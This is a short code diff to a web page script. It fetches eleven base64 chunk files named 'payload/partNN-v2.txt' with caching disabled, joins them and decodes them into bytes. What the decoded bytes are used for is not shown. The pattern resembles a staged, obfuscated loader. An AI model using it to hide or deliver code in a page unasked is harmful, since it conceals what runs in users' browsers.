@@ -17,7 +17,19 @@
 <script>
 (async()=>{
   try{
-    const names=Array.from({length:7},(_,i)=>`payload/part${String(i).padStart(2,'0')}.txt`);
+    const names=[
+      'payload/part00-v2.txt',
+      'payload/part01-v2.txt',
+      'payload/part02-v2.txt',
+      'payload/part03a-v2.txt',
+      'payload/part03b-v2.txt',
+      'payload/part04a-v2.txt',
+      'payload/part04b-v2.txt',
+      'payload/part05a-v2.txt',
+      'payload/part05b-v2.txt',
+      'payload/part06a-v2.txt',
+      'payload/part06b-v2.txt'
+    ];
     const parts=await Promise.all(names.map(async n=>{const r=await fetch(n,{cache:'no-store'});if(!r.ok)throw new Error(`${n}: ${r.status}`);return (await r.text()).trim()}));
     const b64=parts.join('');
     const bin=atob(b64); const bytes=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);
